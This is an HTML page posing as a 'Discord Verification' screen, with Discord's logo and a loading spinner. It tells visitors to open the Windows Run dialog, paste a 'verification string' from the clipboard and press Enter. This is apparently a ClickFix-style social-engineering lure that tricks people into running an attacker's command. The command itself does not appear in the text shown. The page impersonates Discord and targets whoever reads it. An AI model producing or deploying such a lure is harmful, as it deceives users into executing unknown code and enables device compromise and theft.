<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Discord Verification</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #2c2f33;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
    }

    .logo {
      margin-bottom: 30px;
    }

    .logo img {
      width: 80px;
    }

    .loader {
      border: 6px solid #444;
      border-top: 6px solid #7289da;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 30px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .steps {
      background-color: #23272a;
      border-radius: 10px;
      padding: 20px 30px;
      width: 90%;
      max-width: 450px;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
    }

    .step {
      margin-bottom: 20px;
    }

    .step h3 {
      color: #7289da;
      margin-bottom: 8px;
    }

    .step:last-child {
      margin-bottom: 0;
    }

    .highlight {
      font-weight: bold;
      color: #fff;
    }
  </style>
</head>
<body>

  <div class="logo">
    <img src="https://cdn.worldvectorlogo.com/logos/discord-6.svg" alt="Discord Logo">
  </div>

  <div class="loader"></div>

  <div class="steps">
    <div class="step">
      <h3>Step 1:</h3>
      <p>Press <span class="highlight">Windows + R</span> to open the Run dialog box.</p>
    </div>
    <div class="step">
      <h3>Step 2:</h3>
      <p>Paste the verification string with <span class="highlight">CTRL + V</span>.</p>
    </div>
    <div class="step">
      <h3>Step 3:</h3>
      <p>Press <span class="highlight">Enter</span> to complete the authentication.</p>
    </div>
  </div>

</body>
</html>
